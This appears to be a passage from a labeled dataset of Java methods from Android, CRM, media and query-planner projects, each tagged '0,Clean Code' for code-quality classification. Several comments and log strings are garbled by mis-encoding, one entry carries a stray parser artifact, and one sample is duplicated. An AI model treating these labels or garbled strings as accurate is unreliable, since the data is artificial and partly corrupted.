  break;
case MotionEvent.ACTION_UP:
case MotionEvent.ACTION_POINTER_UP:
onUpEvent(x,y,pointerId,eventTime);
break;
case MotionEvent.ACTION_MOVE:
onMoveEvent(x,y,pointerId,eventTime);
break;
}
return true;
}
",0,Clean Code
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  return Preconditions.check(new UsesType<>(""org.openrewrite.Recipe"",true),new JavaIsoVisitor<ExecutionContext>(){
    @Override public J.Annotation visitAnnotation(    J.Annotation annotation,    ExecutionContext ctx){
      if (TypeUtils.isOfClassType(annotation.getType(),""lombok.EqualsAndHashCode"") && getCursor().getParentTreeCursor().getValue() instanceof J.ClassDeclaration) {
        return (J.Annotation)new JavaIsoVisitor<ExecutionContext>(){
          @Override public J.Assignment visitAssignment(          J.Assignment assignment,          ExecutionContext ctx){
            if (assignment.getVariable() instanceof J.Identifier && ""callSuper"".equals(((J.Identifier)assignment.getVariable()).getSimpleName()) && J.Literal.isLiteralValue(assignment.getAssignment(),true)) {
              return assignment.withAssignment(((J.Literal)assignment.getAssignment()).withValue(false).withValueSource(""false""));
            }
            return super.visitAssignment(assignment,ctx);
          }
        }
.visitNonNull(annotation,ctx,getCursor().getParentOrThrow());
      }
      return super.visitAnnotation(annotation,ctx);
    }
  }
);
}
",0,Clean Code
"@Override public <T extends J>J visitParentheses(J.Parentheses<T> parens,P ctx){
  J par=super.visitParentheses(parens,ctx);
  Cursor c=getCursor().pollNearestMessage(UNNECESSARY_PARENTHESES_MESSAGE);
  if (c != null && (c.getValue() instanceof J.Literal || c.getValue() instanceof J.Identifier)) {
    par=new UnwrapParentheses<>((J.Parentheses<?>)par).visit(par,ctx,getCursor().getParentOrThrow());
  }
  assert par != null;
  if (par instanceof J.Parentheses) {
    if (getCursor().getParentTreeCursor().getValue() instanceof J.Parentheses) {
      return ((J.Parentheses<?>)par).getTree().withPrefix(Space.EMPTY);
    }
  }
  return par;
}
",0,Clean Code
"public static Bitmap createBitmap(int width,int height,Bitmap.Config config){
  Bitmap bitmap;
  if (Build.VERSION.SDK_INT < 21) {
    BitmapFactory.Options options=new BitmapFactory.Options();
    options.inDither=true;
    options.inPreferredConfig=config;
    options.inPurgeable=true;
    options.inSampleSize=1;
    options.inMutable=true;
    byte[] array=jpegData.get();
    array[76]=(byte)(height >> 8);
    array[77]=(byte)(height & 0x00ff);
    array[78]=(byte)(width >> 8);
    array[79]=(byte)(width & 0x00ff);
    bitmap=BitmapFactory.decodeByteArray(array,0,array.length,options);
    Utilities.pinBitmap(bitmap);
    bitmap.setHasAlpha(true);
    bitmap.eraseColor(0);
  }
 else {
    bitmap=Bitmap.createBitmap(width,height,config);
  }
  if (config == Bitmap.Config.ARGB_8888 || config == Bitmap.Config.ARGB_4444) {
    bitmap.eraseColor(Color.TRANSPARENT);
  }
  return bitmap;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@741c2081public static Bitmap createBitmap(Bitmap source,int x,int y,int width,int height){
  return createBitmap(source,x,y,width,height,null,false);
}",0,Clean Code
"public void moveLegend(float offset){
  if (chartData == null || selectedIndex == -1 || !legendShowing)   return;
  legendSignatureView.setData(selectedIndex,chartData.x[selectedIndex],(ArrayList<LineViewData>)lines,false);
  legendSignatureView.setVisibility(VISIBLE);
  legendSignatureView.measure(MeasureSpec.makeMeasureSpec(getMeasuredWidth(),MeasureSpec.AT_MOST),MeasureSpec.makeMeasureSpec(getMeasuredHeight(),MeasureSpec.AT_MOST));
  float lXPoint=chartData.xPercentage[selectedIndex] * chartFullWidth - offset;
  if (lXPoint > (chartStart + chartWidth) / 2f) {
    lXPoint-=(legendSignatureView.getWidth() + DP_5);
  }
 else {
    lXPoint+=DP_5;
  }
  if (lXPoint < 0) {
    lXPoint=0;
  }
 else   if (lXPoint + legendSignatureView.getMeasuredWidth() > getMeasuredWidth()) {
    lXPoint=getMeasuredWidth() - legendSignatureView.getMeasuredWidth();
  }
  legendSignatureView.setTranslationX(lXPoint);
}
public void moveLegend(){
  moveLegend(chartFullWidth * (pickerDelegate.pickerStart) - HORIZONTAL_PADDING);
}",0,Clean Code
"public void onMatch(RelOptRuleCall call){
  final Sort sort=call.rel(0);
  final Project project=call.rel(1);
  final RelOptCluster cluster=project.getCluster();
  if (sort.getConvention() != project.getConvention()) {
    return;
  }
  final Mappings.TargetMapping map=RelOptUtil.permutationIgnoreCast(project.getProjects(),project.getInput().getRowType());
  for (  RelFieldCollation fc : sort.getCollation().getFieldCollations()) {
    if (map.getTargetOpt(fc.getFieldIndex()) < 0) {
      return;
    }
    final RexNode node=project.getProjects().get(fc.getFieldIndex());
    if (node.isA(SqlKind.CAST)) {
      final RexCall cast=(RexCall)node;
      final RexCallBinding binding=RexCallBinding.create(cluster.getTypeFactory(),cast,ImmutableList.of(RelCollations.of(RexUtil.apply(map,fc))));
      if (cast.getOperator().getMonotonicity(binding) == SqlMonotonicity.NOT_MONOTONIC) {
        return;
      }
    }
  }
  final RelCollation newCollation=cluster.traitSet().canonize(RexUtil.apply(map,sort.getCollation()));
  final Sort newSort=sort.copy(sort.getTraitSet().replace(newCollation),project.getInput(),newCollation,sort.offset,sort.fetch);
  RelNode newProject=project.copy(sort.getTraitSet(),ImmutableList.of(newSort));
  Map<RelNode,RelNode> equiv;
  if (sort.offset == null && sort.fetch == null && cluster.getPlanner().getRelTraitDefs().contains(RelCollationTraitDef.INSTANCE)) {
    equiv=ImmutableMap.of((RelNode)newSort,project.getInput());
  }
 else {
    equiv=ImmutableMap.of();
  }
  call.transformTo(newProject,equiv);
}",0,Clean Code
"@Override protected void onDetachedFromWindow(){
  super.onDetachedFromWindow();
  try {
    if ((!PipVideoOverlay.isVisible() || webView.getVisibility() != VISIBLE) && webView.getParent() != null) {
      removeView(webView);
      webView.stopLoading();
      webView.loadUrl(""about:blank"");
      webView.destroy();
    }
    if (!videoView.isInline() && !PipVideoOverlay.isVisible()) {
      if (instance == EmbedBottomSheet.this) {
        instance=null;
      }
      videoView.destroy();
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}
@Override protected void onDetachedFromWindow(){
  AndroidUtilities.checkAndroidTheme(context,false);
  super.onDetachedFromWindow();
}
",0,Clean Code
"/** 
 * 鍙戠エ缁熻
 * @param biParams params
 * @return data
 */
@Override public JSONObject invoiceStats(BiParams biParams){
  Integer menuId=106;
  biParams.setMenuId(menuId);
  Integer year=biParams.getYear();
  BiTimeUtil.BiTimeEntity record=BiTimeUtil.analyzeType(biParams);
  DateTime dateTime=DateUtil.beginOfYear(DateUtil.parse(year.toString(),""yyyy""));
  JSONObject total=biEmployeeMapper.totalInvoice(dateTime,DateUtil.endOfYear(dateTime),record.getUserIds());
  Map<String,Object> map=new HashMap<>();
  map.put(""userIds"",record.getUserIds());
  List<JSONObject> objectList=new ArrayList<>(12);
  DateTime offset=DateUtil.beginOfMonth(dateTime);
  for (int i=1; i <= 12; i++) {
    map.put(""startTime"",DateUtil.beginOfMonth(offset));
    map.put(""endTime"",DateUtil.endOfMonth(offset));
    JSONObject object=biEmployeeMapper.invoiceStatsTable(map);
    object.put(""type"",offset.toString(""yyyy-MM""));
    objectList.add(object);
    offset=offset.offset(DateField.MONTH,1);
  }
  return total.fluentPut(""list"",objectList);
}",0,Clean Code
"public static boolean isALegalFileName(@NonNull String name){
  try {
    if (name.trim().isEmpty())     return false;
    if (name.contains(""?"") || name.contains(""\\"") || name.contains(""/"")|| name.contains("":"")|| name.contains(""*"")|| name.contains(""\"""")|| name.contains(""<"")|| name.contains("">"")|| name.contains(""|""))     return false;
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  return true;
}
",0,Clean Code
"@Override @SuppressWarnings(""unchecked"") public Map<String,String> getTransactions(Transport transport,Wallet wallet,Set<String> txids){
  PagedBatchRequestBuilder<String,String> batchRequest=PagedBatchRequestBuilder.create(transport,idCounter).keysType(String.class).returnType(String.class);
  EventManager.get().post(new WalletHistoryStatusEvent(wallet,true,""Retrieving "" + txids.size() + "" transactions""));
  for (  String txid : txids) {
    batchRequest.add(txid,""blockchain.transaction.get"",txid);
  }
  try {
    return batchRequest.execute();
  }
 catch (  JsonRpcBatchException e) {
    Map<String,String> result=(Map<String,String>)e.getSuccesses();
    String strErrorTx=Sha256Hash.ZERO_HASH.toString();
    for (    Object hash : e.getErrors().keySet()) {
      String txhash=(String)hash;
      result.put(txhash,strErrorTx);
    }
    return result;
  }
catch (  Exception e) {
    throw new ElectrumServerRpcException(""Failed to retrieve transactions for txids: "" + txids.stream().map(txid -> ""["" + txid.substring(0,6) + ""]"").collect(Collectors.toList()),e);
  }
}",0,Clean Code
"public void setView(View view,Bundle savedInstanceState){
  attachmentsView=view.findViewById(R.id.attachments);
  attachmentsScroller=view.findViewById(R.id.attachments_scroller);
  attachmentsView.setDividerDrawable(new EmptyDrawable(V.dp(8),0));
  attachmentsView.setDragListener(new AttachmentDragListener());
  attachmentsView.setMoveInBothDimensions(true);
  if (!fragment.getWasDetached() && savedInstanceState != null && savedInstanceState.containsKey(""attachments"")) {
    ArrayList<Parcelable> serializedAttachments=savedInstanceState.getParcelableArrayList(""attachments"");
    for (    Parcelable a : serializedAttachments) {
      DraftMediaAttachment att=Parcels.unwrap(a);
      attachmentsView.addView(createMediaAttachmentView(att));
      attachments.add(att);
    }
    attachmentsScroller.setVisibility(View.VISIBLE);
    updateMediaAttachmentsLayout();
  }
 else   if (!attachments.isEmpty()) {
    attachmentsScroller.setVisibility(View.VISIBLE);
    for (    DraftMediaAttachment att : attachments) {
      attachmentsView.addView(createMediaAttachmentView(att));
    }
    updateMediaAttachmentsLayout();
  }
}",0,Clean Code
"private void initView(){
  ivQRCode=findViewById(R.id.ivQRCode);
  tvAddress=findViewById(R.id.tvAddress);
  refreshQRCode();
  findViewById(R.id.pushLocal).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View v){
      try {
        ClipboardManager manager=(ClipboardManager)PushActivity.this.getSystemService(Context.CLIPBOARD_SERVICE);
        if (manager != null) {
          if (manager.hasPrimaryClip() && manager.getPrimaryClip() != null && manager.getPrimaryClip().getItemCount() > 0) {
            ClipData.Item addedText=manager.getPrimaryClip().getItemAt(0);
            Intent newIntent=new Intent(mContext,DetailActivity.class);
            newIntent.putExtra(""id"",addedText.getText().toString().trim());
            newIntent.putExtra(""sourceKey"",""push_agent"");
            newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            PushActivity.this.startActivity(newIntent);
          }
        }
      }
 catch (      Throwable th) {
      }
    }
  }
);
}",0,Clean Code
"private int checkCRLF(byte[] bytes){
  for (int i=0; i < bytes.length - 3; i++) {
    if (bytes[i] == 13 && bytes[i + 1] == 10) {
      return i;
    }
  }
  return -1;
}
private int checkCRLF(){
  byte[] bytes=byteArrayOutputStream.toByteArray();
  for (int i=0; i < bytes.length - 3; i++) {
    if (bytes[i] == 13 && bytes[i + 1] == 10 && bytes[i + 2] == 13 && bytes[i + 3] == 10) {
      return i;
    }
  }
  return -1;
}",0,Clean Code
"private void maybeUpdateLatency(long systemTimeUs){
  if (isLatencyQuirkEnabled) {
    latencyUs=AmazonQuirks.getAudioHWLatency();
  }
 else   if (isOutputPcm && getLatencyMethod != null && systemTimeUs - lastLatencySampleTimeUs >= MIN_LATENCY_SAMPLE_INTERVAL_US) {
    try {
      latencyUs=castNonNull((Integer)getLatencyMethod.invoke(Assertions.checkNotNull(audioTrack))) * 1000L - bufferSizeUs;
      latencyUs=Math.max(latencyUs,0);
      if (latencyUs > MAX_LATENCY_US) {
        listener.onInvalidLatency(latencyUs);
        latencyUs=0;
      }
    }
 catch (    Exception e) {
      getLatencyMethod=null;
    }
    lastLatencySampleTimeUs=systemTimeUs;
  }
}",0,Clean Code
"/** 
 * 灏哅AP鍙傛暟杞崲涓�&鎷兼帴鐨勮姹傚弬鏁�
 * @param map
 * @return
 */
public static String getUrlParamsByMap(Map<String,Object> map){
  if (map == null) {
    return """";
  }
  StringBuffer sb=new StringBuffer();
  for (  Map.Entry<String,Object> entry : map.entrySet()) {
    sb.append(entry.getKey() + ""="" + entry.getValue());
    sb.append(""&"");
  }
  String s=sb.toString();
  if (s.endsWith(""&"")) {
    s=org.apache.commons.lang.StringUtils.substringBeforeLast(s,""&"");
  }
  return s;
}
",0,Clean Code
"private void onPointerDownInternal(float x,float y){
  if (!mScroll && (mLayoutManager != null && mLayoutManager.canScale())) {
    mScale=true;
  }
}
",0,Clean Code
"@EventListener public void handleAlarmConfigModify(EntityModifyEvent<AlarmConfigEntity> event){
  Map<String,AlarmConfigEntity> beforeMap=event.getBefore().stream().collect(Collectors.toMap(AlarmConfigEntity::getId,Function.identity()));
  event.async(Flux.fromIterable(event.getAfter()).flatMap(config -> handleAlarmConfigCRU(""/_sys/alarm/config/modified"",config).thenReturn(config)).filter(config -> {
    AlarmConfigEntity before=beforeMap.get(config.getId());
    if (before != null) {
      if (StringUtils.hasText(before.getName()) && before.getName().equals(config.getName()) && before.getLevel() != null && before.getLevel().equals(config.getLevel())) {
        return false;
      }
    }
    return true;
  }
).flatMap(this::updateAlarmRecord).then());
}
",0,Clean Code
"@Override protected void onDetachedFromWindow(){
  super.onDetachedFromWindow();
  try {
    if ((!PipVideoOverlay.isVisible() || webView.getVisibility() != VISIBLE) && webView.getParent() != null) {
      removeView(webView);
      webView.stopLoading();
      webView.loadUrl(""about:blank"");
      webView.destroy();
    }
    if (!videoView.isInline() && !PipVideoOverlay.isVisible()) {
      if (instance == EmbedBottomSheet.this) {
        instance=null;
      }
      videoView.destroy();
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}
@Override protected void onDetachedFromWindow(){
  AndroidUtilities.checkAndroidTheme(context,false);
  super.onDetachedFromWindow();
}
",0,Clean Code
"private void invalidateLSWSC(){
  lockScreenSubjectCacheValid=false;
  if (mLayersCreated) {
    mLockScreenSubject.post(() -> {
      mLockScreenSubject.setVisibility(GONE);
      mLockScreenSubject.setBackground(null);
      mWallpaperBackground.setVisibility(GONE);
      mWallpaperBitmapContainer.setBackground(null);
    }
);
  }
  try {
    new File(Constants.getLockScreenSubjectCachePath(mContext)).delete();
  }
 catch (  Throwable ignored) {
  }
}
",0,Clean Code
"/** 
 * Returns all  {@link MediaCodecInfo}s for the given mime type, in the order given by  {@link MediaCodecList}.
 * @param mimeType The MIME type.
 * @param secure Whether the decoder is required to support secure decryption. Always pass falseunless secure decryption really is required.
 * @param tunneling Whether the decoder is required to support tunneling. Always pass false unlesstunneling really is required.
 * @return An unmodifiable list of all {@link MediaCodecInfo}s for the given mime type, in the order given by  {@link MediaCodecList}.
 * @throws DecoderQueryException If there was an error querying the available decoders.
 */
public static synchronized List<MediaCodecInfo> getDecoderInfos(String mimeType,boolean secure,boolean tunneling) throws DecoderQueryException {
  CodecKey key=new CodecKey(mimeType,secure,tunneling);
  List<MediaCodecInfo> cachedDecoderInfos=decoderInfosCache.get(key);
  if (cachedDecoderInfos != null) {
    return cachedDecoderInfos;
  }
  MediaCodecListCompat mediaCodecList=Util.SDK_INT >= 21 ? new MediaCodecListCompatV21(secure,tunneling) : new MediaCodecListCompatV16();
  ArrayList<MediaCodecInfo> decoderInfos=getDecoderInfosInternal(key,mediaCodecList);
  if (secure && decoderInfos.isEmpty() && 21 <= Util.SDK_INT && Util.SDK_INT <= 23) {
    mediaCodecList=new MediaCodecListCompatV16();
    decoderInfos=getDecoderInfosInternal(key,mediaCodecList);
    if (!decoderInfos.isEmpty()) {
      Log.w(TAG,""MediaCodecList API didn't list secure decoder for: "" + mimeType + "". Assuming: ""+ decoderInfos.get(0).name);
    }
  }
  applyWorkarounds(mimeType,decoderInfos);
  List<MediaCodecInfo> unmodifiableDecoderInfos=Collections.unmodifiableList(decoderInfos);
  decoderInfosCache.put(key,unmodifiableDecoderInfos);
  return unmodifiableDecoderInfos;
}",0,Clean Code
"public void showOpenUrlAlert(final String url,boolean ask){
  if (Browser.isInternalUrl(url,null) || !ask || NekoConfig.skipOpenLinkConfirm.Bool()) {
    Browser.openUrl(getParentActivity(),url,true);
  }
 else {
    AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
    builder.setTitle(LocaleController.getString(""OpenUrlTitle"",R.string.OpenUrlTitle));
    builder.setMessage(LocaleController.formatString(""OpenUrlAlert2"",R.string.OpenUrlAlert2,url));
    builder.setPositiveButton(LocaleController.getString(""Open"",R.string.Open),(dialogInterface,i) -> Browser.openUrl(getParentActivity(),url,true));
    builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
    showDialog(builder.create());
  }
}",0,Clean Code
"@RequestMapping(value=""import"",method=RequestMethod.POST) public TeslaBaseResult jobImport(@ModelAttribute StreamJobCreateParam param) throws Exception {
  param.setCreator(getUserEmployeeId());
  param.setOperator(getUserEmployeeId());
  if (param.getTags() == null) {
    param.setTags(new JSONArray());
  }
  if (param.getDescription() == null) {
    param.setDescription("""");
  }
  byte[] bytes=param.getFile().getBytes();
  File zipFile=Files.createTempFile(""stream-job"","".zip"").toFile();
  Files.write(zipFile.toPath(),bytes);
  log.info(""job import => {}"",param);
  SreworksStreamJobDTO job=streamJobService.importFile(param,zipFile);
  return buildSucceedResult(job);
}
",0,Clean Code
"public static void cleanDirectory(File directory) throws IOException {
  if (!directory.exists()) {
    String message=directory + "" does not exist"";
    throw new IllegalArgumentException(message);
  }
  if (!directory.isDirectory()) {
    String message=directory + "" is not a directory"";
    throw new IllegalArgumentException(message);
  }
  File[] files=directory.listFiles();
  if (files == null) {
    throw new IOException(""Failed to list contents of "" + directory);
  }
  IOException exception=null;
  for (  File file : files) {
    try {
      delete(file);
    }
 catch (    IOException ioe) {
      exception=ioe;
    }
  }
  if (null != exception) {
    throw exception;
  }
}
",0,Clean Code
"@SneakyThrows @Override protected Object getColumnValue(ResultSet rs,int index,PropertyDescriptor pd){
  if (pd.getName().equals(""applicationFilter"")) {
    String applicationFilterJson=rs.getString(""application_filter"");
    if (StringUtils.isEmpty(applicationFilterJson)) {
      return null;
    }
    return mapper.readValue(applicationFilterJson,new TypeReference<ApplicationFilter>(){
    }
);
  }
 else   if (pd.getName().equals(""probeType"")) {
    return ProbeType.valueOf(rs.getString(""probe_type""));
  }
 else {
    return super.getColumnValue(rs,index,pd);
  }
}
",0,Clean Code
"private boolean isMajorEnoughMoveToBeOnNewKey(final int x,final int y,final long eventTime,final Key newKey){
  final Key curKey=mCurrentKey;
  if (newKey == curKey) {
    return false;
  }
  if (curKey == null) {
    return true;
  }
  final int keyHysteresisDistanceSquared=mKeyDetector.getKeyHysteresisDistanceSquared(mIsInSlidingKeyInput);
  final int distanceFromKeyEdgeSquared=curKey.squaredDistanceToEdge(x,y);
  if (distanceFromKeyEdgeSquared >= keyHysteresisDistanceSquared) {
    if (DEBUG_MODE) {
      final float distanceToEdgeRatio=(float)Math.sqrt(distanceFromKeyEdgeSquared) / mKeyboard.mMostCommonKeyWidth;
      Log.d(TAG,String.format(Locale.US,""[%d] isMajorEnoughMoveToBeOnNewKey:"" + "" %.2f key width from key edge"",mPointerId,distanceToEdgeRatio));
    }
    return true;
  }
  if (!mIsAllowedDraggingFinger && sTypingTimeRecorder.isInFastTyping(eventTime) && mBogusMoveEventDetector.hasTraveledLongDistance(x,y)) {
    if (DEBUG_MODE) {
      final float keyDiagonal=(float)Math.hypot(mKeyboard.mMostCommonKeyWidth,mKeyboard.mMostCommonKeyHeight);
      final float lengthFromDownRatio=mBogusMoveEventDetector.getAccumulatedDistanceFromDownKey() / keyDiagonal;
      Log.d(TAG,String.format(Locale.US,""[%d] isMajorEnoughMoveToBeOnNewKey:"" + "" %.2f key diagonal from virtual down point"",mPointerId,lengthFromDownRatio));
    }
    return true;
  }
  return false;
}",0,Clean Code
"public static int[] getMaxWindow(int[] arr,int w){
  if (arr == null || w < 1 || arr.length < w) {
    return null;
  }
  LinkedList<Integer> qmax=new LinkedList<Integer>();
  int[] res=new int[arr.length - w + 1];
  int index=0;
  for (int R=0; R < arr.length; R++) {
    while (!qmax.isEmpty() && arr[qmax.peekLast()] <= arr[R]) {
      qmax.pollLast();
    }
    qmax.addLast(R);
    if (qmax.peekFirst() == R - w) {
      qmax.pollFirst();
    }
    if (R >= w - 1) {
      res[index++]=arr[qmax.peekFirst()];
    }
  }
  return res;
}",0,Clean Code
"/** 
 * Hides the logo view and makes other fragment views visible. Also initializes the texts for Title and Description views.
 */
void hideLogoView(){
  mLogoView.setVisibility(View.GONE);
  if (mIconResourceId != 0) {
    mMainIconView.setImageResource(mIconResourceId);
    mMainIconView.setVisibility(View.VISIBLE);
  }
  View container=getView();
  LayoutInflater inflater=getThemeInflater(LayoutInflater.from(getContext()));
  ViewGroup backgroundContainer=(ViewGroup)container.findViewById(R.id.background_container);
  View background=onCreateBackgroundView(inflater,backgroundContainer);
  if (background != null) {
    backgroundContainer.setVisibility(View.VISIBLE);
    backgroundContainer.addView(background);
  }
  ViewGroup contentContainer=(ViewGroup)container.findViewById(R.id.content_container);
  View content=onCreateContentView(inflater,contentContainer);
  if (content != null) {
    contentContainer.setVisibility(View.VISIBLE);
    contentContainer.addView(content);
  }
  ViewGroup foregroundContainer=(ViewGroup)container.findViewById(R.id.foreground_container);
  View foreground=onCreateForegroundView(inflater,foregroundContainer);
  if (foreground != null) {
    foregroundContainer.setVisibility(View.VISIBLE);
    foregroundContainer.addView(foreground);
  }
  container.findViewById(R.id.page_container).setVisibility(View.VISIBLE);
  container.findViewById(R.id.content_container).setVisibility(View.VISIBLE);
  if (getPageCount() > 1) {
    mPageIndicator.setPageCount(getPageCount());
    mPageIndicator.onPageSelected(mCurrentPageIndex,false);
  }
  if (mCurrentPageIndex == getPageCount() - 1) {
    mStartButton.setVisibility(View.VISIBLE);
  }
 else {
    mPageIndicator.setVisibility(View.VISIBLE);
  }
  mTitleView.setText(getPageTitle(mCurrentPageIndex));
  mDescriptionView.setText(getPageDescription(mCurrentPageIndex));
}",0,Clean Code
"@Override public List<Map<String,Object>> exportRecordList(BiParams biParams){
  Integer crmType=biParams.getLabel();
  String endTime=biParams.getEndTime();
  String startTime=biParams.getStartTime();
  Integer queryType=biParams.getQueryType();
  String search=biParams.getSearch() == null ? null : biParams.getSearch().trim();
  BiAuthority biAuthority=handleDataType(biParams);
  List<Long> userIds=biAuthority.getUserIds();
  if (CollUtil.isEmpty(userIds)) {
    return new ArrayList<>();
  }
  userIds=this.handleUserIds(biParams,userIds);
  Integer type=BiTimeUtil.analyzeType(biParams.getType());
  return crmActivityMapper.exportRecordList(Dict.create().set(""crmType"",crmType).set(""type"",type).set(""userIds"",userIds).set(""startTime"",startTime).set(""endTime"",endTime).set(""queryType"",queryType).set(""search"",search));
}
",0,Clean Code
"@Override public final PayRefundRespDTO unifiedRefund(PayRefundUnifiedReqDTO reqDTO){
  ValidationUtils.validate(reqDTO);
  PayRefundRespDTO resp;
  try {
    resp=doUnifiedRefund(reqDTO);
  }
 catch (  ServiceException ex) {
    throw ex;
  }
catch (  Throwable ex) {
    log.error(""[unifiedRefund][瀹㈡埛绔�({}) request({}) 鍙戣捣閫�娆惧紓甯竇"",getId(),toJsonString(reqDTO),ex);
    throw buildPayException(ex);
  }
  return resp;
}
",0,Clean Code
"/** 
 * 搜索hive表
 */
@RequestMapping(method=RequestMethod.GET,path=""/search"") public Message searchHiveTbl(@RequestParam(required=false) String classification,@RequestParam(defaultValue="""") String query,@RequestParam(defaultValue="""") String keyword,@RequestParam(defaultValue=DEFAULT_LIMIT) int limit,@RequestParam(defaultValue=DEFAULT_OFFSET) int offset) throws Exception {
  List<HiveTblSimpleInfo> hiveTblSimpleInfoList=assetService.searchHiveTable(classification,query.trim(),limit,offset);
  if (hiveTblSimpleInfoList == null || keyword == null || keyword.trim().equals("""")) {
    return Message.ok().data(""result"",hiveTblSimpleInfoList);
  }
 else {
    Pattern regex=Pattern.compile(keyword);
    return Message.ok().data(""result"",hiveTblSimpleInfoList.stream().filter(ele -> regex.matcher(ele.getOwner()).find()).collect(Collectors.toList()));
  }
}
",0,Clean Code
"/** 
 * Loads the current binary dictionary from internal storage. Assumes the dictionary file exists.
 */
void loadBinaryDictionaryLocked(){
  if (DBG_STRESS_TEST) {
    try {
      Log.w(TAG,""Start stress in loading: "" + mDictName);
      Thread.sleep(15000);
      Log.w(TAG,""End stress in loading"");
    }
 catch (    InterruptedException e) {
      Log.w(TAG,""Interrupted while loading: "" + mDictName,e);
    }
  }
  final BinaryDictionary oldBinaryDictionary=mBinaryDictionary;
  openBinaryDictionaryLocked();
  if (oldBinaryDictionary != null) {
    oldBinaryDictionary.close();
  }
  if (mBinaryDictionary.isValidDictionary() && needsToMigrateDictionary(mBinaryDictionary.getFormatVersion())) {
    if (!mBinaryDictionary.migrateTo(DICTIONARY_FORMAT_VERSION)) {
      Log.e(TAG,""Dictionary migration failed: "" + mDictName);
      removeBinaryDictionaryLocked();
    }
  }
}",0,Clean Code
"/** 
 * Verifies whether the next bytes in  {@code header} are a vorbis header of the given{@code headerType}.
 * @param headerType the type of the header expected.
 * @param header the alleged header bytes.
 * @param quiet if {@code true} no exceptions are thrown. Instead {@code false} is returned.
 * @return the number of bytes read.
 * @throws ParserException thrown if header type or capture pattern is not as expected.
 */
public static boolean verifyVorbisHeaderCapturePattern(int headerType,ParsableByteArray header,boolean quiet) throws ParserException {
  if (header.bytesLeft() < 7) {
    if (quiet) {
      return false;
    }
 else {
      throw new ParserException(""too short header: "" + header.bytesLeft());
    }
  }
  if (header.readUnsignedByte() != headerType) {
    if (quiet) {
      return false;
    }
 else {
      throw new ParserException(""expected header type "" + Integer.toHexString(headerType));
    }
  }
  if (!(header.readUnsignedByte() == 'v' && header.readUnsignedByte() == 'o' && header.readUnsignedByte() == 'r' && header.readUnsignedByte() == 'b' && header.readUnsignedByte() == 'i' && header.readUnsignedByte() == 's')) {
    if (quiet) {
      return false;
    }
 else {
      throw new ParserException(""expected characters 'vorbis'"");
    }
  }
  return true;
}",0,Clean Code
"@ExceptionHandler(Exception.class) protected ResponseEntity<Object> handleGenericException(Exception ex,WebRequest request){
  logger.error(""Exception, "",ex);
  String acceptHeaderValue=request.getHeader(""Accept"");
  if (acceptHeaderValue == null || acceptHeaderValue.trim().isEmpty()) {
    acceptHeaderValue="""";
  }
  if (acceptHeaderValue.contains(MediaType.TEXT_XML_VALUE) || acceptHeaderValue.contains(MediaType.TEXT_HTML_VALUE) || acceptHeaderValue.contains(MediaType.APPLICATION_XHTML_XML_VALUE)|| acceptHeaderValue.contains(MediaType.APPLICATION_XML_VALUE)) {
    ServletUriComponentsBuilder builder=ServletUriComponentsBuilder.fromCurrentContextPath();
    builder.path(""/error500.html"");
    builder.build().toUri();
    HttpHeaders headers=new HttpHeaders();
    headers.setLocation(builder.build().toUri());
    return new ResponseEntity<>(headers,HttpStatus.INTERNAL_SERVER_ERROR);
  }
 else {
    ApiError apiError=new ApiError(HttpStatus.INTERNAL_SERVER_ERROR);
    apiError.setMessage(""Something went wrong, Please try again later! If the problem persists, please contact stacksimplify support."");
    apiError.setDebugMessage(ex.getMessage());
    return buildResponseEntity(apiError);
  }
}",0,Clean Code
"private void onProvisionResponse(Object request,Object response){
  if (request != currentProvisionRequest || (state != STATE_OPENING && !isOpen())) {
    return;
  }
  currentProvisionRequest=null;
  if (response instanceof Exception) {
    provisioningManager.onProvisionError((Exception)response);
    return;
  }
  try {
    mediaDrm.provideProvisionResponse((byte[])response);
  }
 catch (  Exception e) {
    provisioningManager.onProvisionError(e);
    return;
  }
  provisioningManager.onProvisionCompleted();
}
",0,Clean Code
"@Test public void testSeeking_handlesSeekingForward_extractsCorrectFrames_forNarrowBandAmr() throws IOException, InterruptedException {
  String fileName=NARROW_BAND_AMR_FILE;
  Uri fileUri=TestUtil.buildAssetUri(fileName);
  expectedTrackOutput=TestUtil.extractAllSamplesFromFile(createAmrExtractor(),ApplicationProvider.getApplicationContext(),fileName).trackOutputs.get(0);
  AmrExtractor extractor=createAmrExtractor();
  FakeExtractorOutput extractorOutput=new FakeExtractorOutput();
  SeekMap seekMap=TestUtil.extractSeekMap(extractor,extractorOutput,dataSource,fileUri);
  FakeTrackOutput trackOutput=extractorOutput.trackOutputs.get(0);
  long firstSeekTimeUs=980_000;
  TestUtil.seekToTimeUs(extractor,seekMap,firstSeekTimeUs,dataSource,trackOutput,fileUri);
  long targetSeekTimeUs=1_200_000;
  int extractedFrameIndex=TestUtil.seekToTimeUs(extractor,seekMap,targetSeekTimeUs,dataSource,trackOutput,fileUri);
  assertThat(extractedFrameIndex).isNotEqualTo(-1);
  assertFirstFrameAfterSeekContainTargetSeekTime(trackOutput,targetSeekTimeUs,extractedFrameIndex);
}",0,Clean Code
"private Component createTextEditor(String templateYaml){
  final RSyntaxTextArea textEditor=createSmartTextEditor(templateYaml);
  if (UIManager.getLookAndFeel().getID().toLowerCase().contains(""dark"")) {
    final InputStream resourceAsStream=this.getClass().getResourceAsStream(""/org/fife/ui/rsyntaxtextarea/themes/dark.xml"");
    final Theme theme;
    try {
      theme=Theme.load(resourceAsStream);
      theme.apply(textEditor);
    }
 catch (    IOException e) {
      this.nucleiGeneratorSettings.logError(e.getMessage());
    }
  }
  textEditor.setFont(textEditor.getFont().deriveFont(this.nucleiGeneratorSettings.getFontSize().floatValue()));
  this.templateEditor=textEditor;
  final RTextScrollPane scrollPane=new RTextScrollPane(textEditor,true);
  scrollPane.setBorder(BorderFactory.createTitledBorder(""Template""));
  scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED);
  scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
  return scrollPane;
}
